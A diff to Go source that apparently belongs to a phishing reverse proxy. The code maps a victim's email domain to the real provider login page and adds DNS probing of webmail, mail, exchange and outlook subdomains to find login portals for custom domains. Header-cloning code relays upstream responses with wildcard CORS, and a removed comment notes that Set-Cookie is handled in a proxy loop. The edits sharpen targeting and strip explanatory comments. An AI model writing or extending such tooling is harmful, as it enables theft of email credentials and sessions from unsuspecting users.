@@ -1,11 +1,11 @@
 package main
 
 import (
+	"net"
 	"net/http"
 	"strings"
 )
 
-// ProviderMapping maps email domains to their actual login URLs
 var ProviderMapping = map[string]string{
 	"gmail.com":      "https://accounts.google.com/",
 	"google.com":     "https://accounts.google.com/",
@@ -34,20 +34,30 @@ var ProviderMapping = map[string]string{
 func GetTargetDomain(email string) string {
 	parts := strings.Split(email, "@")
 	if len(parts) < 2 {
-		return "https://accounts.google.com/" // Default fallback
+		return "https://accounts.google.com/"
 	}
 	domain := strings.ToLower(parts[1])
+
 	if target, ok := ProviderMapping[domain]; ok {
 		return target
 	}
-	// Fallback: assume it's a standard webmail (good for cPanel / custom domains)
-	return "https://webmail." + domain + "/"
+
+	// Smart DNS Fallback for Custom Domains
+	subdomains := []string{"webmail", "mail", "exchange", "outlook"}
+	for _, sub := range subdomains {
+		fullDomain := sub + "." + domain
+		_, err := net.LookupHost(fullDomain)
+		if err == nil {
+			return "https://" + fullDomain + "/"
+		}
+	}
+
+	// If DNS fails entirely, fallback to standard domain
+	return "https://" + domain + "/"
 }
 
-// CloneHeaders copies critical headers from the upstream response to the client
 func CloneHeaders(src *http.Response, dst http.ResponseWriter) {
 	dst.Header().Set("Content-Type", src.Header.Get("Content-Type"))
 	dst.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
-	dst.Header().Set("Access-Control-Allow-Origin", "*") // Allows JS to load resources
-	// Note: Set-Cookie is handled in the proxy loop
+	dst.Header().Set("Access-Control-Allow-Origin", "*")
 }
